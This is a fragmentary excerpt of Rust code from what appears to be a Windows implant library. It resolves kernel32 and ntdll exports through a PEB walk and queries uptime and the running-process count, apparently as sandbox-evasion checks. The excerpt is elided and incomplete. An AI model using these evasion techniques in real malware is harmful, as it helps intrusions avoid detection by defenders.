...
//! The PEB-walk API resolution lives in [`nyx_implant_core::resolve`]; this module
...
unsafe fn get_tick_count64() -> u64 {
    ...
    if let Some(addr) = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"GetTickCount64") {
...
unsafe fn running_process_count_query() -> Option<nyx_implant_core::heap::Vec<u8>> {
    // SystemProcessInformation = 0x5
    const SYSTEM_PROCESS_INFO: u32 = 0x5;

    let nt_query =
        nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtQuerySystemInformation")?;
